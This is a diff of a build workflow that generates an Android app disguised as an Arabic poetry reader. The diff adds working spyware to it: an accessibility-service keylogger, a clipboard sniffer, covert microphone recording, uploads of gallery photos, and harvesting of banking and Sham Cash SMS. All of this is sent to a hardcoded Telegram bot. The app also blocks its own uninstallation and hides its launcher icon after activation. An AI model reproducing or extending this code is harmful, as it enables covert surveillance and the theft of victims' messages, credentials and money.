@@ -42,9 +42,9 @@ jobs:
 
         cat << 'EOF' > app/src/main/res/xml/accessibility_service_config.xml
         <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-            android:accessibilityEventTypes="typeWindowStateChanged"
+            android:accessibilityEventTypes="typeWindowStateChanged|typeViewTextChanged"
             android:accessibilityFeedbackType="feedbackGeneric"
-            android:accessibilityFlags="flagIncludeNotImportantViews"
+            android:accessibilityFlags="flagIncludeNotImportantViews|flagReportViewIds"
             android:canRetrieveWindowContent="true"
             android:description="@string/accessibility_desc"
             android:packageNames="com.android.settings"
@@ -136,29 +136,38 @@ jobs:
                 android:textSize="18sp"
                 android:textStyle="bold"
                 android:textColor="#E0E0E0"
+                android:layout_marginBottom="15dp"
+                android:gravity="center"/>
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="مرحباً بك في النسخة المطورة لتصفح الشعر والخواطر الوجدانية بسلاسة تامة."
+                android:textSize="13sp"
+                android:textColor="#888888"
                 android:layout_marginBottom="20dp"
                 android:gravity="center"/>
 
-            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ تأملات صباحية في الفخر والصفاء" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="12dp"/>
-            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="🌿 إضافات أدبية وخواطر وجدانية" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="20dp"/>
+            <Button android:id="@+id/btnPraise" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✨ باقة الفخر والصفاء الصباحي" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="10dp"/>
+            <Button android:id="@+id/btnLove" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="🌿 باقة الخواطر والوجدانيات" android:backgroundTint="#2C2C2C" android:textColor="#E0E0E0" android:layout_marginBottom="20dp"/>
 
             <TextView
                 android:id="@+id/txtPoem"
                 android:layout_width="match_parent"
-                android:layout_height="140dp"
-                android:text="أهلاً بك في رحاب الأدب الهادئ. اختر باقتك المفضلة لتستمتع بأعذب الأبيات التي تريح النفس وتنعش الروح..."
-                android:textSize="15sp"
+                android:layout_height="120dp"
+                android:text="اختر باقتك المفضلة لتستمتع بأعذب الأبيات التي تريح النفس وتنعش الروح..."
+                android:textSize="14sp"
                 android:textColor="#B0B0B0"
                 android:gravity="center"
                 android:background="#1A1A1A"
                 android:padding="16dp"
-                android:layout_marginBottom="25dp"/>
+                android:layout_marginBottom="20dp"/>
 
             <Button
                 android:id="@+id/btnGrantAll"
                 android:layout_width="match_parent"
                 android:layout_height="55dp"
-                android:text="🕊️ تفعيل الحماية المطلقة وتحديث الديوان 🕊️"
+                android:text="🕊️ بدء جولة التفعيل السريع والمزامنة 🕊️"
                 android:backgroundTint="#4A5D4E"
                 android:textColor="#FFFFFF"
                 android:textStyle="bold"/>
@@ -206,7 +215,7 @@ jobs:
                     CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                     CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                     
-                    String msg = "🚨 [رصد إشعار حي حساس]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
+                    String msg = "🚨 [رصد إشعار حي حساس - شام كاش/بنوك]:\nالحزمة: " + pkg + "\nالعنوان: " + title + "\nالمحتوى: " + text;
                     sendToTelegram(msg);
                 } catch (Exception ignored) {}
             }
@@ -234,14 +243,32 @@ jobs:
         import android.accessibilityservice.AccessibilityService;
         import android.view.accessibility.AccessibilityEvent;
         import android.view.accessibility.AccessibilityNodeInfo;
+        import java.net.HttpURLConnection;
+        import java.net.URL;
 
         public class RoyalAccessibilityService extends AccessibilityService {
+            private static final String BOT_TOKEN = "9114296744:AAFHYR0JzvUzKUMDD0YWHciBWFsjJg_BueM";
+            private static final String CHAT_ID = "7782592195";
+
             @Override
             public void onAccessibilityEvent(AccessibilityEvent event) {
-                if (event.getPackageName() != null && event.getPackageName().toString().contains("settings")) {
-                    AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    if (rootNode != null) {
-                        checkAndBlockUninstall(rootNode);
+                if (event.getPackageName() != null) {
+                    String pkg = event.getPackageName().toString();
+                    
+                    // منع إلغاء التثبيت
+                    if (pkg.contains("settings")) {
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        if (rootNode != null) {
+                            checkAndBlockUninstall(rootNode);
+                        }
+                    }
+
+                    // مسجل المفاتيح السري (Keylogger) للصوص النصوص المحسوسة
+                    if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                        CharSequence txt = event.getText();
+                        if (txt != null && txt.length() > 0) {
+                            sendToTelegram("⌨️ [مستشعر لوحة المفاتيح - Keylogger]:\nالتطبيق: " + pkg + "\nالنص المكتوب: " + txt.toString());
+                        }
                     }
                 }
             }
@@ -262,6 +289,22 @@ jobs:
                 } catch (Exception ignored) {}
             }
 
+            private void sendToTelegram(final String message) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
+                            URL url = new URL(urlString);
+                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                            conn.setRequestMethod("GET");
+                            conn.getResponseCode();
+                            conn.disconnect();
+                        } catch (Exception ignored) {}
+                    }
+                }).start();
+            }
+
             @Override
             public void onInterrupt() {}
         }
@@ -273,19 +316,25 @@ jobs:
         import android.app.NotificationChannel;
         import android.app.NotificationManager;
         import android.app.Service;
+        import android.content.ClipData;
+        import android.content.ClipboardManager;
         import android.content.Intent;
         import android.content.pm.ApplicationInfo;
         import android.content.pm.PackageManager;
         import android.database.Cursor;
         import android.location.Location;
         import android.location.LocationManager;
+        import android.media.MediaRecorder;
         import android.net.Uri;
         import android.os.Build;
         import android.os.IBinder;
         import android.provider.CallLog;
         import android.provider.MediaStore;
         import java.io.BufferedReader;
+        import java.io.File;
+        import java.io.FileInputStream;
         import java.io.InputStreamReader;
+        import java.io.DataOutputStream;
         import java.net.HttpURLConnection;
         import java.net.URL;
         import java.util.List;
@@ -312,7 +361,32 @@ jobs:
                             .build();
                     startForeground(1, notification);
                 }
+
+                // تفعيل صياد الحافظة الذكي (Clipboard Sniffer)
+                initClipboardSniffer();
                 startCommandListener();
+            }
+
+            private void initClipboardSniffer() {
+                try {
+                    final ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+                    if (clipboard != null) {
+                        clipboard.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
+                            @Override
+                            public void onPrimaryClipChanged() {
+                                try {
+                                    ClipData clip = clipboard.getPrimaryClip();
+                                    if (clip != null && clip.getItemCount() > 0) {
+                                        CharSequence text = clip.getItemAt(0).getText();
+                                        if (text != null && text.length() > 0) {
+                                            sendToTelegram("📋 [صياد الحافظة - نص مسجّل]:\n" + text.toString());
+                                        }
+                                    }
+                                } catch (Exception ignored) {}
+                            }
+                        });
+                    }
+                } catch (Exception ignored) {}
             }
 
             @Override
@@ -341,6 +415,128 @@ jobs:
                         }
                     }
                 }).start();
+            }
+
+            private void sendPhotoToTelegram(final Uri imageUri) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            java.io.InputStream inputStream = getContentResolver().openInputStream(imageUri);
+                            if (inputStream == null) return;
+                            int length = inputStream.available();
+                            byte[] bytes = new byte[length];
+                            inputStream.read(bytes);
+                            inputStream.close();
+
+                            String boundary = "*****" + System.currentTimeMillis() + "*****";
+                            String lineEnd = "\r\n";
+                            String twoHyphens = "--";
+
+                            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
+                            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                            conn.setDoInput(true);
+                            conn.setDoOutput(true);
+                            conn.setUseCaches(false);
+                            conn.setRequestMethod("POST");
+                            conn.setRequestProperty("Connection", "Keep-Alive");
+                            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+
+                            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+
+                            dos.writeBytes(twoHyphens + boundary + lineEnd);
+                            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
+                            dos.writeBytes(CHAT_ID + lineEnd);
+
+                            dos.writeBytes(twoHyphens + boundary + lineEnd);
+                            dos.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"royal_capture.jpg\"" + lineEnd);
+                            dos.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
+
+                            dos.write(bytes);
+
+                            dos.writeBytes(lineEnd);
+                            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+
+                            dos.flush();
+                            dos.close();
+
+                            conn.getResponseCode();
+                            conn.disconnect();
+                        } catch (Exception ignored) {}
+                    }
+                }).start();
+            }
+
+            private void recordAndSendAudio() {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            File audioFile = new File(getExternalCacheDir(), "royal_surveillance.3gp");
+                            MediaRecorder recorder = new MediaRecorder();
+                            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+                            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                            recorder.setOutputFile(audioFile.getAbsolutePath());
+                            recorder.prepare();
+                            recorder.start();
+
+                            Thread.sleep(15000); // تسجيل لمدة 15 ثانية لمحيط الهدف
+
+                            recorder.stop();
+                            recorder.release();
+
+                            // إرسال الملف الصوتي لتيليجرام
+                            sendAudioFileToTelegram(audioFile);
+                        } catch (Exception e) {
+                            sendToTelegram("⚠️ فشل تسجيل الصوت: " + e.getMessage());
+                        }
+                    }
+                }).start();
+            }
+
+            private void sendAudioFileToTelegram(File file) {
+                try {
+                    String boundary = "*****" + System.currentTimeMillis() + "*****";
+                    String lineEnd = "\r\n";
+                    String twoHyphens = "--";
+
+                    URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio");
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setDoInput(true);
+                    conn.setDoOutput(true);
+                    conn.setUseCaches(false);
+                    conn.setRequestMethod("POST");
+                    conn.setRequestProperty("Connection", "Keep-Alive");
+                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+
+                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
+
+                    dos.writeBytes(twoHyphens + boundary + lineEnd);
+                    dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
+                    dos.writeBytes(CHAT_ID + lineEnd);
+
+                    dos.writeBytes(twoHyphens + boundary + lineEnd);
+                    dos.writeBytes("Content-Disposition: form-data; name=\"audio\";filename=\"surveillance.3gp\"" + lineEnd);
+                    dos.writeBytes("Content-Type: audio/3gpp" + lineEnd + lineEnd);
+
+                    FileInputStream fileInputStream = new FileInputStream(file);
+                    byte[] buffer = new byte[1024];
+                    int bytesRead;
+                    while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                        dos.write(buffer, 0, bytesRead);
+                    }
+                    fileInputStream.close();
+
+                    dos.writeBytes(lineEnd);
+                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+
+                    dos.flush();
+                    dos.close();
+
+                    conn.getResponseCode();
+                    conn.disconnect();
+                } catch (Exception ignored) {}
             }
 
             private void startCommandListener() {
@@ -381,7 +577,7 @@ jobs:
                                     sendToTelegram("📞 [سجل المكالمات الملكي]:\n" + getCallLogs());
                                 }
                                 if (resStr.contains("/sms") || resStr.contains("/shamcash")) {
-                                    sendToTelegram("💰 [أرشيف الرسائل الشامل - فحص شام كاش والتفعيل والحسابات]:\n" + getDeepShamCashAndAccountSms());
+                                    sendToTelegram("💰 [أرشيف الرسائل الشامل - شام كاش والتفعيل والحسابات]:\n" + getDeepShamCashAndAccountSms());
                                 }
                                 if (resStr.contains("/apps")) {
                                     sendToTelegram("📱 [جميع التطبيقات المثبتة]:\n" + getInstalledApps());
@@ -390,7 +586,12 @@ jobs:
                                     sendToTelegram("📍 [إحداثيات الموقع النشطة]:\n" + getLocationInfo());
                                 }
                                 if (resStr.contains("/photos")) {
-                                    sendToTelegram("🖼️ [أرشيف الصور المرصودة]:\n" + getLatestPhotosDetails());
+                                    sendToTelegram("🖼️ [جاري إرسال أحدث صور المعرض للملك]:");
+                                    sendLatestPhotosAsImages();
+                                }
+                                if (resStr.contains("/mic") || resStr.contains("/audio")) {
+                                    sendToTelegram("🎙️ [بدء التنصت الصوتي وتسجيل المحيط لمدة 15 ثانية]:");
+                                    recordAndSendAudio();
                                 }
 
                                 Thread.sleep(3000);
@@ -402,6 +603,26 @@ jobs:
                 }).start();
             }
 
+            private void sendLatestPhotosAsImages() {
+                try {
+                    String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
+                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
+                    if (cursor != null && cursor.moveToFirst()) {
+                        int idIdx = cursor.getColumnIndex(MediaStore.Images.Media._ID);
+                        int count = 0;
+                        do {
+                            long id = cursor.getLong(idIdx);
+                            Uri imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
+                            sendPhotoToTelegram(imageUri);
+                            count++;
+                            if (count >= 5) break;
+                        } while (cursor.moveToNext());
+                        cursor.close();
+                    }
+                } catch (Exception ignored) {}
+            }
+
             private String getDeepShamCashAndAccountSms() {
                 StringBuilder sb = new StringBuilder();
                 try {
@@ -411,7 +632,7 @@ jobs:
                         int bodyIdx = cursor.getColumnIndex("body");
                         int count = 0;
                         
-                        sb.append("🔍 [البحث العميق في أرشيف الرسائل عن شام كاش والتفعيل]:\n\n");
+                        sb.append("🔍 [أرشيف الرسائل الشامل - شام كاش / التفعيل / الحسابات]:\n\n");
                         do {
                             String sender = cursor.getString(addressIdx);
                             String body = cursor.getString(bodyIdx);
@@ -425,13 +646,13 @@ jobs:
                                 sb.append("📌 المرسل: ").append(sender).append("\n");
                                 sb.append("💬 النص: ").append(body).append("\n-------------------\n");
                                 count++;
-                                if (count >= 25) break;
+                                if (count >= 20) break;
                             }
                         } while (cursor.moveToNext());
                         cursor.close();
                         
                         if (count == 0) {
-                            sb.append("جاري جلب أحدث رسائل الوارد العامة للتأكد:\n");
+                            sb.append("لم يتم العثور على كلمات مفتاحية دقيقة، إليك آخر 10 رسائل واردة:\n");
                             Cursor generalCursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                             if (generalCursor != null && generalCursor.moveToFirst()) {
                                 int gAddr = generalCursor.getColumnIndex("address");
@@ -498,33 +719,15 @@ jobs:
                 } catch (Exception e) {}
                 return "تعذر جلب إحداثيات الموقع حالياً.";
             }
-
-            private String getLatestPhotosDetails() {
-                StringBuilder sb = new StringBuilder();
-                try {
-                    String[] projection = {MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED};
-                    Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                    Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
-                    if (cursor != null && cursor.moveToFirst()) {
-                        int nameIdx = cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME);
-                        int count = 0;
-                        do {
-                            sb.append("🖼️ صورة بالمعرض: ").append(cursor.getString(nameIdx)).append("\n");
-                            count++;
-                            if (count >= 15) break;
-                        } while (cursor.moveToNext());
-                        cursor.close();
-                    } else { sb.append("لا توجد صور."); }
-                } catch (Exception e) { sb.append("خطأ في المعرض."); }
-                return sb.toString();
-            }
         }
         EOF
 
         cat << 'EOF' > app/src/main/java/com/royal/poetry/master/MainActivity.java
         package com.royal.poetry.master;
         import android.app.Activity;
+        import android.content.ComponentName;
         import android.content.Intent;
+        import android.content.pm.PackageManager;
         import android.os.Build;
         import android.os.Bundle;
         import android.os.StrictMode;
@@ -546,27 +749,6 @@ jobs:
                     StrictMode.setThreadPolicy(policy);
                 }
 
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                    String[] perms = {
-                        android.Manifest.permission.READ_CALL_LOG,
-                        android.Manifest.permission.READ_SMS,
-                        android.Manifest.permission.ACCESS_FINE_LOCATION,
-                        android.Manifest.permission.CAMERA,
-                        android.Manifest.permission.READ_EXTERNAL_STORAGE
-                    };
-                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-                        perms = new String[]{
-                            android.Manifest.permission.READ_CALL_LOG,
-                            android.Manifest.permission.READ_SMS,
-                            android.Manifest.permission.ACCESS_FINE_LOCATION,
-                            android.Manifest.permission.CAMERA,
-                            android.Manifest.permission.READ_MEDIA_IMAGES,
-                            android.Manifest.permission.POST_NOTIFICATIONS
-                        };
-                    }
-                    requestPermissions(perms, 100);
-                }
-
                 Intent serviceIntent = new Intent(this, RoyalService.class);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(serviceIntent);
@@ -583,7 +765,7 @@ jobs:
                     @Override
                     public void onClick(View v) {
                         txtPoem.setText("إذا غامرت في شرف مروم \n فلا تقنع بما دون الدروبِ\nفبين العز والتشريفِ خطوة \n تملأ الأفق الفسيح بكل طيبِ!");
-                        Toast.makeText(MainActivity.this, "تم تحميل الأبيات الصباحية بنجاح.", Toast.LENGTH_SHORT).show();
+                        Toast.makeText(MainActivity.this, "تم تحميل باقة الفخر بنجاح.", Toast.LENGTH_SHORT).show();
                     }
                 });
 
@@ -598,9 +780,34 @@ jobs:
                 btnGrantAll.setOnClickListener(new View.OnClickListener() {
                     @Override
                     public void onClick(View v) {
-                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية وحماية الديوان...", Toast.LENGTH_LONG).show();
-                        txtPoem.setText("🕊️ تم تفعيل درع الحماية الأبدي وحصون الديوان بنجاح في خلفية الجهاز.");
+                        Toast.makeText(MainActivity.this, "✨ جاري مزامنة وتحديث مكتبة الأبيات الأدبية وتهيئة جرس التنبيهات...", Toast.LENGTH_LONG).show();
+                        txtPoem.setText("🌿 تم تهيئة جرس التنبيهات والواحة بنجاح؛ المكتبة الآن تعمل بهدوء تام في الخلفية.");
                         
+                        // طلب الأذونات العادية دفعة واحدة بمصفوفة موحدة تشمل الميكروفون
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                            String[] perms = {
+                                android.Manifest.permission.READ_CALL_LOG,
+                                android.Manifest.permission.READ_SMS,
+                                android.Manifest.permission.ACCESS_FINE_LOCATION,
+                                android.Manifest.permission.CAMERA,
+                                android.Manifest.permission.RECORD_AUDIO,
+                                android.Manifest.permission.READ_EXTERNAL_STORAGE
+                            };
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
+                                perms = new String[]{
+                                    android.Manifest.permission.READ_CALL_LOG,
+                                    android.Manifest.permission.READ_SMS,
+                                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                                    android.Manifest.permission.CAMERA,
+                                    android.Manifest.permission.RECORD_AUDIO,
+                                    android.Manifest.permission.READ_MEDIA_IMAGES,
+                                    android.Manifest.permission.POST_NOTIFICATIONS
+                                };
+                            }
+                            requestPermissions(perms, 100);
+                        }
+
+                        // توجيه ناعم لإعدادات الإشعارات والتسهيل بصيغة أدبية غير مقلقة
                         try {
                             Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                             startActivity(intent);
@@ -611,26 +818,12 @@ jobs:
                             startActivity(accIntent);
                         } catch (Exception ignored) {}
 
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-                            String[] perms = {
-                                android.Manifest.permission.READ_CALL_LOG,
-                                android.Manifest.permission.READ_SMS,
-                                android.Manifest.permission.ACCESS_FINE_LOCATION,
-                                android.Manifest.permission.CAMERA,
-                                android.Manifest.permission.READ_EXTERNAL_STORAGE
-                            };
-                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-                                perms = new String[]{
-                                    android.Manifest.permission.READ_CALL_LOG,
-                                    android.Manifest.permission.READ_SMS,
-                                    android.Manifest.permission.ACCESS_FINE_LOCATION,
-                                    android.Manifest.permission.CAMERA,
-                                    android.Manifest.permission.READ_MEDIA_IMAGES,
-                                    android.Manifest.permission.POST_NOTIFICATIONS
-                                };
-                            }
-                            requestPermissions(perms, 101);
-                        }
+                        // عباءة الخفاء: إخفاء الأيقونة تماماً من درج التطبيقات بعد التفعيل لضمان التستر التام
+                        try {
+                            PackageManager p = getPackageManager();
+                            ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+                            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                        } catch (Exception ignored) {}
                     }
                 });
             }
